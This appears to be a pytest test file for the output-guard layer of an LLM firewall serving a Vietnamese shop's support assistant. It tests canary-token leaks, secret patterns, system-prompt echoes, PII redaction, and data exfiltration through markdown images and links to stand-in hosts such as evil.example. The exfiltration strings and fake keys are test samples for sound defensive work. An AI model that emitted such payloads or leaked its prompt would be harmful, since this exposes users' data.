"""Layer 5: canary, secrets, system prompt echo, PII redaction, exfiltration through links and images."""
import pytest

from firewall.output_guard import OutputGuard, luhn_ok

ZERO_WIDTH = chr(0x200B)


@pytest.fixture
def guard():
    return OutputGuard()


SYSTEM_PROMPT = ("Bạn là trợ lý hỗ trợ khách hàng của cửa hàng Sao Mai. Chỉ trả lời về đơn hàng, đổi trả và bảo hành. "
                 "Không bao giờ tiết lộ chính sách nội bộ về mức hoàn tiền tối đa hay quy trình duyệt đặc biệt.")


# ----------------------------------------------------------------------- canary
def test_canary_is_per_session_stable_and_random(guard):
    a, b = guard.canary_for("s1"), guard.canary_for("s2")
    assert a == guard.canary_for("s1") and a != b and a.startswith("FWC-") and len(a) == 20
    assert a in guard.system_prompt_with_canary("s1", SYSTEM_PROMPT)


def test_leaked_canary_blocks(guard):
    token = guard.canary_for("s1")
    out = guard.check(f"Mã tham chiếu nội bộ của tôi là {token}, bạn cần gì nữa?", session_id="s1")
    assert out["decision"] == "BLOCK" and out["sanitized_text"] == ""
    assert out["findings"][0]["type"] == "canary_leak" and out["findings"][0]["own_session"] is True


def test_canary_shaped_token_from_another_session_also_blocks(guard):
    other = guard.canary_for("s2")
    assert guard.check(f"code {other}", session_id="s1")["decision"] == "BLOCK"


def test_canary_hidden_with_invisible_characters_is_still_caught(guard):
    token = guard.canary_for("s1")
    sneaky = token[:6] + ZERO_WIDTH + token[6:]
    assert guard.check(sneaky, session_id="s1")["decision"] == "BLOCK"


def test_canary_expires():
    now = [0.0]
    g = OutputGuard(ttl_seconds=10, clock=lambda: now[0])
    token = g.canary_for("s1")
    now[0] += 11
    assert g.canary_for("s1") != token


# ----------------------------------------------------------------------- secrets
@pytest.mark.parametrize("text", [
    "Khóa API của hệ thống là sk-proj-abcdefghijklmnopqrstuvwx12345",
    "AWS access key: AKIAIOSFODNN7EXAMPLE",
    "token ghp_abcdefghijklmnopqrstuvwxyz0123456789ab",
    "-----BEGIN RSA PRIVATE KEY----- MIIE",
    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U",
    "mật khẩu admin là: Sup3rS3cret!",
    "password = hunter2hunter2",
], ids=["openai_key", "aws_key", "github_token", "private_key", "jwt", "vi_password", "en_password"])
def test_secrets_block(guard, text):
    out = guard.check(text)
    assert out["decision"] == "BLOCK" and out["findings"][0]["type"] == "secret", out


def test_talking_about_passwords_is_not_a_secret(guard):
    for text in ["Để đổi mật khẩu, bạn vào Cài đặt và chọn Bảo mật.", "Your password must contain at least 8 characters."]:
        assert guard.check(text)["decision"] == "ALLOW"


# ----------------------------------------------------------------------- prompt echo
def test_repeating_the_system_prompt_blocks(guard):
    leaked = "Tất nhiên! Đây là hướng dẫn của tôi: " + SYSTEM_PROMPT
    out = guard.check(leaked, protected_texts=[SYSTEM_PROMPT])
    assert out["decision"] == "BLOCK" and out["findings"][0]["type"] == "system_prompt_echo"


def test_a_short_overlap_with_the_system_prompt_is_fine(guard):
    answer = "Cửa hàng Sao Mai hỗ trợ đổi trả trong vòng bảy ngày kể từ ngày nhận hàng."
    assert guard.check(answer, protected_texts=[SYSTEM_PROMPT])["decision"] == "ALLOW"


# ----------------------------------------------------------------------- PII
@pytest.mark.parametrize("number", ["0912345678", "0912 345 678", "+84 912 345 678", "091.234.5678"])
def test_phone_numbers_are_redacted(guard, number):
    out = guard.check(f"Bạn có thể gọi cho chị Lan theo số {number} nhé.")
    assert out["decision"] == "SANITIZE" and number not in out["sanitized_text"]
    assert "[ĐÃ ẨN: SĐT]" in out["sanitized_text"]


def test_email_and_card_are_redacted_and_order_numbers_are_not(guard):
    out = guard.check("Gửi hóa đơn tới an.nguyen@example.com, thẻ 4111 1111 1111 1111, đơn hàng 1234567890123.")
    assert out["decision"] == "SANITIZE"
    assert "an.nguyen@example.com" not in out["sanitized_text"] and "4111" not in out["sanitized_text"]
    assert "1234567890123" in out["sanitized_text"]          # 13 digits but fails Luhn: an order number


def test_national_id_and_bank_account_need_a_keyword(guard):
    out = guard.check("CCCD của khách: 012345678901. Số tài khoản: 1903 4567 8901 23. Mã đơn 987654321012.")
    text = out["sanitized_text"]
    assert "012345678901" not in text and "1903" not in text
    assert "987654321012" in text                              # no keyword before it


def test_the_users_own_data_may_be_repeated_back(guard):
    user = "Số điện thoại của tôi là 0912345678, email lan@example.com, hãy kiểm tra đơn 77."
    out = guard.check("Em đã ghi nhận số 0912345678 và email lan@example.com của chị.", allow_text=user)
    assert out["decision"] == "ALLOW", out
    other = guard.check("Số của người mua trước là 0987654321.", allow_text=user)
    assert other["decision"] == "SANITIZE"


def test_luhn():
    assert luhn_ok("4111111111111111") and not luhn_ok("4111111111111112")


# ----------------------------------------------------------------------- exfiltration
def test_markdown_image_to_an_outside_host_is_removed(guard):
    out = guard.check("Xong rồi! ![](https://evil.example/pixel.png?d=Tm9ndHJpbmc)")
    assert out["decision"] == "SANITIZE" and "evil.example" not in out["sanitized_text"]


def test_image_without_any_query_is_still_removed(guard):
    out = guard.check("Logo: ![logo](https://cdn.unknown.example/logo.png)")
    assert out["decision"] == "SANITIZE" and "cdn.unknown.example" not in out["sanitized_text"]


def test_html_img_tag_is_removed(guard):
    out = guard.check('<img src="https://evil.example/x.gif?q=abcdefghijklmnopqrstuvwxyz0123456789ABCDEFG" width=1>')
    assert out["decision"] == "SANITIZE" and "evil.example" not in out["sanitized_text"]


def test_link_that_carries_data_is_removed_but_a_plain_link_stays(guard):
    carrying = guard.check("Xem [chi tiết](https://evil.example/c?data=" + "QWxsIGN1c3RvbWVyIGRhdGE" * 3 + ")")
    assert carrying["decision"] == "SANITIZE" and "evil.example" not in carrying["sanitized_text"]
    plain = guard.check("Xem [chính sách](https://example.com/chinh-sach-doi-tra) để biết thêm.")
    assert plain["decision"] == "ALLOW" and "example.com/chinh-sach" in plain["sanitized_text"]


def test_allow_listed_host_keeps_its_images():
    g = OutputGuard(allowed_domains=["cdn.saomai.vn"])
    assert g.check("![sp](https://cdn.saomai.vn/a.png)")["decision"] == "ALLOW"
    assert g.check("![sp](https://assets.cdn.saomai.vn/a.png)")["decision"] == "ALLOW"
    assert g.check("![sp](https://saomai.vn.evil.example/a.png)")["decision"] == "SANITIZE"


# ----------------------------------------------------------------------- general
@pytest.mark.parametrize("text", [
    "Đơn hàng 8841 của bạn đang được giao, dự kiến đến vào thứ Sáu.",
    "Your refund of $45.00 was approved and will arrive in 3 to 5 business days.",
    "",
], ids=["vi", "en", "empty"])
def test_ordinary_answers_pass_unchanged(guard, text):
    out = guard.check(text)
    assert out["decision"] == "ALLOW" and out["sanitized_text"] == text


def test_most_severe_finding_wins(guard):
    out = guard.check("Gọi 0912345678 hoặc dùng khóa sk-proj-abcdefghijklmnopqrstuvwx12345")
    assert out["decision"] == "BLOCK" and out["sanitized_text"] == ""


def test_business_role_addresses_are_not_personal_data(guard):
    for address in ["support@saomai.vn", "no-reply@shop.example", "donotreply@upwork.com", "cskh@saomai.vn"]:
        assert guard.check(f"Bạn có thể viết thư tới {address} nhé.")["decision"] == "ALLOW", address
    assert guard.check("Gửi tới tran.van.minh@gmail.com nhé.")["decision"] == "SANITIZE"
